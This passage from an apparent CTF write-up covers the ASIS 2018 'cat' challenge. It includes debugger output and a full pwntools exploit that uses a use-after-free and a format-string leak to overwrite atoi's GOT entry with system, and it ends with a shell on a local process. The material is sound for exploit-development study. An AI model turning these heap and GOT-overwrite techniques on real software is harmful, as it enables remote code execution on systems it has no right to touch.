[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf28 --> 0x401085 (lea    rax,[rbp-0x20])
0008| 0x7fffffffdf30 --> 0xff0000 
0016| 0x7fffffffdf38 --> 0x1 
0024| 0x7fffffffdf40 --> 0x401120 (push   r15)
0032| 0x7fffffffdf48 --> 0x400750 (xor    ebp,ebp)
0040| 0x7fffffffdf50 --> 0x7fffffffe040 --> 0x1 
0048| 0x7fffffffdf58 --> 0x3f8c9edc40331c00 
0056| 0x7fffffffdf60 --> 0x401120 (push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7b08890 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$ p __read_nocancel+7
$1 = (<text variable, no debug info> *) 0x7ffff7b08890 <__read_nocancel+7>
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0x7ffff7a556a0 <__libc_system>
```

Then find the offset using python:
```
>>> hex(0x7ffff7a556a0 - 0x7ffff7b08890)
'-0xb31f0
```

So we can see that the offset from our leaked libc address to system is `-0xb31f0`. With that we have everything we need, we can just simply overwrite the got address of `atoi` with the libc address of `system`, that way when it calls `atoi` with a char pointer that we control as it's input, it will call `system` and we get to decide what it executes (thus we get remote code execution).

#### Write System

For this, the process is pretty similar to the first time we overwrote `atoi` (except the address we are overwritting it with). The biggest difference here is that since the `atoi` function has been replaced by `printf`, how we interface with the program has to be different (however it is still possible). Essentially our input would have to make printf output 1-6, you can look at the full exploit below to see how that's done. Also one more thing, you may of noticed that in my exploits, whenever I use the use after Free to do the overwrite I always include two 8 byte addresses afterwards, that is because that when i do the write there is a newline character that goes at the end of my input. If I didn't have values there, it would write over the existing data and cause a crash when I try to write to it. The reason why is is those two addresses is because when we take a look at the memory we can see that those two addresses are in a writeable section of memory with a static address:

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00402000         r-xp	/Hackery/asis18q/rev/cat/cat
0x00601000         0x00602000         r--p	/Hackery/asis18q/rev/cat/cat
0x00602000         0x00603000         rw-p	/Hackery/asis18q/rev/cat/cat
0x022e7000         0x02308000         rw-p	[heap]
0x00007efe40150000 0x00007efe4030e000 r-xp	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007efe4030e000 0x00007efe4050d000 ---p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007efe4050d000 0x00007efe40511000 r--p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007efe40511000 0x00007efe40513000 rw-p	/lib/x86_64-linux-gnu/libc-2.24.so
0x00007efe40513000 0x00007efe40517000 rw-p	mapped
0x00007efe40517000 0x00007efe4053d000 r-xp	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007efe40715000 0x00007efe40717000 rw-p	mapped
0x00007efe40739000 0x00007efe4073c000 rw-p	mapped
0x00007efe4073c000 0x00007efe4073d000 r--p	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007efe4073d000 0x00007efe4073e000 rw-p	/lib/x86_64-linux-gnu/ld-2.24.so
0x00007efe4073e000 0x00007efe4073f000 rw-p	mapped
0x00007ffef5647000 0x00007ffef5668000 rw-p	[stack]
0x00007ffef56aa000 0x00007ffef56ac000 r--p	[vvar]
0x00007ffef56ac000 0x00007ffef56ae000 r-xp	[vdso]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

Here is the full exploit:
```
from pwn import *

#Start the target process, and attach gdb
target = process('./cat')
#gdb.attach(target)

#Establish the needed constants for later
printf_plt = p64(0x4006d0)
atoi_got = p64(0x602068)
sys_offset = -0xb31f0

#Establish the various functions which we will need to interact with the program
def create_pet(name, pet_type, age):
	target.sendline('1')
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')

def create_pet_post_write(name, pet_type, age):
	target.sendline('1\x00')
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')

def edit_pet(index, name, pet_type, age, modify):
	target.sendline('2')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')
	target.sendline(modify)
	target.recvuntil('>')

def edit_pet_post_write(index, name, pet_type, age, modify):
	target.sendline('22\x00')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	target.sendline(name)
	target.recvuntil('>')
	target.sendline(pet_type)
	target.recvuntil('>')
	target.sendline(age)
	target.recvuntil('>')
	target.sendline(modify)
	target.recvuntil('>')

def print_pet(index):
	target.sendline('3')
	target.recvuntil('>')
	target.sendline(index)
	target.recvuntil('>')
	name = target.recvline()
	kind = target.recvline()
	age = target.recvline()
	print "name: " + name
	print "kind: " + kind
	print "age: " + age
	target.recvuntil('>')


#Setup and execute the overwrite for the got address of atoi to the plt address of printf
target.recvuntil('>')

create_pet('reverent', 'drummer', '16')
edit_pet('0', '789654123', '95175382', '16', 'n')
create_pet('reverent', atoi_got + p64(0x602100) + p64(0x602300), '16')
edit_pet('0', printf_plt, '15935728', '16', 'y')
print target.recvuntil('>')

#Leak the libc address, and calculate the address of system
target.sendline('%3$p')
leak = target.recvline()
leak = leak.replace("Invalid command! (=+_+=)\n", "")
leak = int(leak, 16)
system = leak + sys_offset
print "The leak is: " + hex(leak)
print "The address of system is: " + hex(system)

#Write over the got address of atoi with the plt address of printf
edit_pet_post_write('\x00', '789654123', '95175382', '1\x00', 'n')
create_pet_post_write('reverent', atoi_got + p64(0x602100) + p64(0x602300)[:6], '1\x00')
edit_pet_post_write('\x00', p64(system), '15935728', 'sh', 'n')

#Drop to an interactive shell
target.interactive()
```

When we run it:

```
$	python exploit.py 
[+] Starting local process './cat': pid 10330
 edit id 0
------------------------------------------------
 1: create pet record
 2: edit pet record
 3: print record
 4: print all record
 5: delete record
 6: exit
------------------------------------------------
which command?
>
The leak is: 0x7f9267372890
The address of system is: 0x7f92672bf6a0
[*] Switching to interactive mode
 How old?
> sh: 1: n: not found
$ ks
sh: 2: ks: not found
$ ls
cat    exploit.py  notes           peda-session-ls.txt          sh
cat.xz    leak.py     peda-session-cat.txt   peda-session-w.procps.txt  try.py
core    mine.py     peda-session-dash.txt  readme.md              xpl.py
$ w
 19:01:30 up  5:07,  1 user,  load average: 1.09, 1.21, 1.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               07:20   11:41m 10:35   0.04s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ 
[*] Interrupted
[*] Stopped process './cat' (pid 10330)
```

As you can see, we popped a shell. One thing to note that was wierd, when I tried to execute commands like `ls` and `cat` it would work fine. However when I tried to call `/bin/sh`, it produced an error. I saw in other writeups that they were just able to call `sh` to get a shell, so I just copied that binary into my local directory and it worked out in the end. Once again this writeup is based off of this writeup: `https://kileak.github.io/ctf/2018/asisquals18-cat/`
